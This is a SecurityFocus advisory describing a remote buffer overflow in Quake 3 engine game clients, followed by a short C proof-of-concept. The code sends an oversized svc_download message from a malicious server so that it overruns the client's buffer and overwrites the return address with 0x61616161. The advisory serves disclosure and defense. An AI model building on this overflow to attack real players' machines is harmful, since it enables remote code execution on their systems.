source: http://www.securityfocus.com/bid/18271/info

The Quake 3 engine is susceptible to a remote buffer-overflow vulnerability. This issue is due to the application's failure to properly bounds-check user-supplied data before copying it to an insufficiently sized memory buffer.

Remote attackers may exploit this issue to execute arbitrary machine code in the context of affected game clients. Failed exploit attempts will likely crash affected clients.

Quake 3 version 1.32c and Icculus.org Quake 3 revision 795 are vulnerable to this issue; other versions may also be affected. The affected game engine has been used to create many derivative games, which may also be affected.

// send the gamestate
int i;
MSG_WriteByte( &msg, svc_download );
MSG_WriteShort( &msg, -1 ); // block != 0, for fast return
MSG_WriteShort( &msg, 16384 + 32 ); // amount of bytes to copy
for(i = 0; i < 16384; i++) { // overwrite the data buffer
MSG_WriteByte(&msg, 0x00); // 0x00 for saving space
}
for(i = 0; i < 32; i++) { // do the rest of the job
MSG_WriteByte(&msg, 'a'); // return address: 0x61616161
}
SV_SendMessageToClient( &msg, client );
return;